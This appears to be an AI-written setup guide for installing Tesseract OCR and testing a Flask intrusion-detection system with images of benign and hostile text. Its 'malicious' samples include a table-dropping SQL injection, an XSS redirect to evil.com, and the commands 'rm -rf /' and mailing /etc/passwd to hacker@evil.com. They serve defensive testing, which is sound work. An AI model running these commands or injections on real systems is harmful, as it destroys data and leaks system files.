# 🖼️ OCR Setup Guide for Image Analysis

## 📥 Install Tesseract OCR on Windows

### Step 1: Download Tesseract
1. Go to: https://github.com/UB-Mannheim/tesseract/wiki
2. Download the latest Windows installer (.exe file)
3. Run the installer and follow the setup wizard
4. **Important**: During installation, note the installation path (usually `C:\Program Files\Tesseract-OCR`)

### Step 2: Add to System PATH
1. Open System Properties → Environment Variables
2. Add the Tesseract installation path to your PATH variable
3. Example: `C:\Program Files\Tesseract-OCR`

### Step 3: Verify Installation
Open Command Prompt and run:
```bash
tesseract --version
```

### Step 4: Install Python Package
```bash
pip install pytesseract
```

## 🎯 Image Test Examples

Since you don't have OCR installed yet, here are examples of what to test:

### 🔴 MALICIOUS IMAGE TEXT EXAMPLES (3)

Create simple images (using Paint or any image editor) with this text:

#### Image 1: SQL Injection
```
Username: admin
Password: ' OR 1=1; DROP TABLE users; --
```

#### Image 2: XSS Attack
```
<script>
alert('Website compromised!');
document.location='http://evil.com';
</script>
```

#### Image 3: Command Injection
```
File: important.txt; rm -rf /
Command: cat /etc/passwd | mail hacker@evil.com
```

### 🟢 NORMAL IMAGE TEXT EXAMPLES (3)

#### Image 1: System Message
```
System Status: All services running normally
Last backup: January 15, 2024 at 2:00 AM
Next maintenance: January 20, 2024
```

#### Image 2: User Information
```
Name: John Doe
Department: IT Support
Email: john.doe@company.com
Phone: (555) 123-4567
```

#### Image 3: Meeting Notes
```
Meeting: Weekly Team Standup
Date: January 15, 2024
Attendees: 12 people
Topics: Project updates, Q1 planning
```

## 🔧 Quick Test Without OCR

If you want to test the system before installing OCR:

1. **Text Analysis**: Use the examples from `test_data_text_examples.md`
2. **CSV Analysis**: Use the CSV files I created:
   - `test_malicious_1.csv` (SQL injection)
   - `test_malicious_2.csv` (phishing)
   - `test_malicious_3.csv` (network attacks)
   - `test_normal_1.csv` (user activity)
   - `test_normal_2.csv` (system logs)
   - `test_normal_3.csv` (support tickets)

## 📝 Alternative: Create Simple Test Images

Use any image editor to create PNG/JPG files with the malicious/normal text examples above. The OCR will extract the text and analyze it for threats.

## ⚡ Quick OCR Installation (Alternative Method)

If the main installation doesn't work, try:

1. Download portable version from: https://digi.bib.uni-mannheim.de/tesseract/
2. Extract to `C:\tesseract`
3. Add `C:\tesseract` to your PATH
4. Restart your command prompt/IDE

## 🎉 Ready to Test!

Once Tesseract is installed:
1. Restart your Flask application
2. Go to the IDS page
3. Try uploading images with the text examples above
4. The system will extract text using OCR and analyze for threats!
